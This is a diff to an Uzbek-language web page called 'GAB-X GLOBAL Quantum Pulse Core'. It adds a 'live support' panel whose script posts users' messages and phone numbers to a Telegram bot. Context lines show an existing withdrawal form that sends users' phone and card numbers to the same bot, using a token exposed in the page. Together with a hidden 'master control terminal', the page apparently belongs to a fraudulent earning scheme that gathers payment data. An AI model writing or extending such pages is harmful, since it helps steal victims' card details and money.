@@ -261,6 +261,45 @@
             box-shadow: 0 8px 30px rgba(0, 102, 255, 0.55);
         }
 
+        /* 📡 LIVE SUPPORT PANEL DESIGN */
+        .support-panel {
+            margin-top: 25px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 210, 255, 0.25);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: left;
+        }
+        .support-header {
+            font-size: 12px;
+            font-weight: 900;
+            color: var(--neon-blue);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .support-header::before {
+            content: ''; display: inline-block; width: 8px; height: 8px; 
+            background: var(--neon-green); border-radius: 50%; box-shadow: 0 0 8px var(--neon-green);
+        }
+        .support-box {
+            display: flex; gap: 10px;
+        }
+        .support-box input {
+            flex: 1; background: #000; border: 1px solid rgba(0, 210, 255, 0.3);
+            border-radius: 10px; padding: 12px; color: #fff; font-size: 13px; outline: none;
+        }
+        .support-box input:focus { border-color: var(--neon-blue); }
+        .support-box button {
+            background: rgba(0, 210, 255, 0.15); border: 1px solid var(--neon-blue);
+            color: var(--neon-blue); padding: 0 18px; border-radius: 10px; cursor: pointer;
+            font-weight: bold; font-size: 12px; transition: 0.2s; text-transform: uppercase;
+        }
+        .support-box button:hover { background: var(--neon-blue); color: #000; box-shadow: 0 0 15px var(--neon-blue); }
+
         .gateway-promo-input {
             margin-top: 20px;
             text-align: center;
@@ -428,7 +467,7 @@
         
         <div class="brand-header">
             <h1>GAB-X GLOBAL</h1>
-            <div class="brand-subtitle">Quantum Pulse Core v1.9</div>
+            <div class="brand-subtitle">Quantum Pulse Core v2.0</div>
         </div>
 
         <div class="identity-badge" id="authGate">
@@ -466,11 +505,19 @@
 
         <button class="trigger-action-btn" id="coreTriggerBtn" onclick="togglePulseEngine()">PULSE SIGNALINI YUBORISH</button>
 
+        <div class="support-panel">
+            <div class="support-header">GAB-X Secure Live Support Pipeline</div>
+            <div class="support-box">
+                <input type="text" id="supportMessage" placeholder="Savol yoki muammoingizni yozing...">
+                <button onclick="sendSupportTicket()">Yuborish</button>
+            </div>
+        </div>
+
         <input type="text" id="gatewayPromo" class="gateway-promo-input" placeholder="Tizim boshqaruv kaliti / Promokod..." onkeydown="if(event.key==='Enter') executePromoEvaluator()">
 
         <div class="ceo-terminal" id="ceoTerminalPanel">
             <div class="terminal-header">
-                <span class="terminal-title">GAB-X MASTER CONTROL TERMINAL v1.9</span>
+                <span class="terminal-title">GAB-X MASTER CONTROL TERMINAL v2.0</span>
                 <span class="terminal-close" onclick="document.getElementById('ceoTerminalPanel').style.display='none'">[X]</span>
             </div>
             <div id="terminalConsoleLog" class="terminal-log"></div>
@@ -649,6 +696,30 @@
             body: JSON.stringify({ chat_id: CHAT_ID, text: `🚨 [QUANTUM PULSE VIVOD SO'ROVI]\nTel: +${phone}\nKarta: ${card}\nSumma: ${sum} UZS` })
         });
         alert("Sizning chiqim arizangiz GAB-X yadrosiga yuborildi!");
+    }
+
+    /* 📡 LIVE SUPPORT LOGIC INTERACTION */
+    function sendSupportTicket() {
+        let msgField = document.getElementById('supportMessage');
+        let msg = msgField.value.trim();
+        if(!msg) { alert("Iltimos, xabarni kiriting!"); return; }
+        
+        let clientIdentity = phone ? `+${phone}` : "Anonim Foydalanuvchi";
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST", headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                text: `💬 [GAB-X LIVE SUPPORT TICKET]\nKimdan: ${clientIdentity}\nXabar: ${msg}` 
+            })
+        }).then(res => {
+            if(res.ok) {
+                alert("Sizning xabaringiz GAB-X global support xizmatiga yuborildi. Operator tez orada bog'lanadi!");
+                msgField.value = "";
+            } else {
+                alert("Signal uzatishda xatolik yuz berdi.");
+            }
+        });
     }
 
     function executePromoEvaluator() {
